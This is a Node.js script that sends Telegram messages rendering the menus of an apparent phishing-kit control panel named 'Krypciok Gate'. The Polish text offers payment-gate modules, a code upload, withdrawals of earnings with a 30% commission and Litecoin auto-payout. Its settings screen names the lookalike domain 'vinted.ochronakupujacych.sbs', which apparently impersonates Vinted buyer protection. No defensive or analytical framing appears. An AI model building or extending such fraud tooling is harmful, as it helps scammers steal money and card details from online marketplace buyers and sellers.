const TG=require("/opt/krypciokgate/node_modules/node-telegram-bot-api");
const fs=require("fs");
const TOKEN=(fs.readFileSync("/opt/krypciokgate/banita.env","utf8").match(/^TOKEN=(.+)$/m)||[])[1].trim();
const bot=new TG(TOKEN,{polling:false});
const pe=(k,f)=>{const m={globe:"5776233299424843260",id:"5766994197705921104",chart:"5938539885907415367",sparkle:"5778226250149532337",coin:"5778613750688911681",wallet:"5769126056262898415",lock:"6037249452824072506",refresh:"6030657343744644592",gear:"5904258298764334001",compass:"6030687898141987254",bank:"5879814368572478751",bolt:"5884428842780594914",check:"5774022692642492953",cross:"6030757850274336631",doc:"6034969813032374911",person:"6032994772321309200",tag:"5888620056551625531",hourglass:"5891211339170326418",shield:"6030537007350944596",shop:"5920332557466997677",plus:"6032924188828767321",ban:"5938215362473496448",bell:"6021418126061605425",card:"5778421276024509124",robot:"6030400221232501136",phone:"6039605143601680423",trophy:"6037428784888549034",diamond:"5776023601941582822",note:"5920046907782074235",chat:"6030784887093464891",link:"6028171274939797252",arrowDown:"6037157012242960559",key:"6037249452824072506"};const i=m[k];return i?`<tg-emoji emoji-id="${i}">${f}</tg-emoji>`:f;};
const CHAT=8806188013;
const mainKb={inline_keyboard:[
 [{text:"Bramki płatności",icon_custom_emoji_id:"5778672437122045013",callback_data:"a"}],
 [{text:"Wrzuć kod",icon_custom_emoji_id:"6039573425268201570",callback_data:"b"}],
 [{text:"Wypłać środki",icon_custom_emoji_id:"5778421276024509124",callback_data:"c"},{text:"Ustawienia",icon_custom_emoji_id:"5904258298764334001",callback_data:"d"}]
]};
const box=[
`${pe("globe","🌐")}<b>Centrum</b>`,
`${pe("id","🗂")}ID: <code>8806188013</code>`,
`${pe("chart","📈")}Prowizja: <code>30.0%</code>`,
``,
`${pe("sparkle","✨")}<b>Portfel</b>`,
`${pe("coin","🪙")}Zarobione razem: <code>1284.00 PLN</code>`,
`${pe("wallet","👛")}Gotowe do wypłaty: <code>148.20 PLN</code>`,
``,
`${pe("sparkle","✨")}<b>Stan</b>`,
`${pe("sparkle","✨")}<b>Status:</b> <code>Online</code> | ${pe("lock","🔒")}<b>Limit wpłaty:</b> <code>brak limitu</code>`
].join("\n");
(async()=>{
const m=await bot.sendPhoto(CHAT,fs.createReadStream("/opt/krypciokgate/banita.png"),{caption:"p",parse_mode:"HTML"});
await bot.editMessageMedia({type:"photo",media:"attach://banita.png",parse_mode:"HTML",caption:`<b>Krypciok Gate</b>\n\n<blockquote>${box}</blockquote>\n\nWybierz moduł poniżej.`},{chat_id:CHAT,message_id:m.message_id,reply_markup:mainKb});
const m2=await bot.sendPhoto(CHAT,fs.createReadStream("/opt/krypciokgate/banita.png"),{caption:"p",parse_mode:"HTML"});
await bot.editMessageMedia({type:"photo",media:"attach://banita.png",parse_mode:"HTML",caption:`${pe("gear","⚙")} <b>Ustawienia</b>\n\nKliknij przycisk poniżej, aby edytować daną opcję.\n\n<blockquote>${pe("globe","🌐")} <b>Tryb domeny:</b> Publiczna\n${pe("compass","🧭")} <b>Aktywna domena:</b> <code>vinted.ochronakupujacych.sbs</code>\n${pe("wallet","👛")} <b>Adres LTC:</b> <code>ltc1qxy...</code>\n${pe("bolt","⚡")} <b>Auto-wypłata:</b> 🟢 Włączona</blockquote>`},{chat_id:CHAT,message_id:m2.message_id,reply_markup:{inline_keyboard:[
 [{text:"Używaj domeny publicznej",icon_custom_emoji_id:"5776233299424843260",callback_data:"e"}],
 [{text:"Podłącz własną domenę",icon_custom_emoji_id:"6028171274939797252",callback_data:"f"}],
 [{text:"Zmień adres LTC",icon_custom_emoji_id:"5769126056262898415",callback_data:"g"}],
 [{text:"Przełącz Auto-wypłatę",icon_custom_emoji_id:"5884428842780594914",callback_data:"h"}],
 [{text:"Menu główne",icon_custom_emoji_id:"5895507195524550741",callback_data:"i"}]
]}});
console.log("OK");
})();
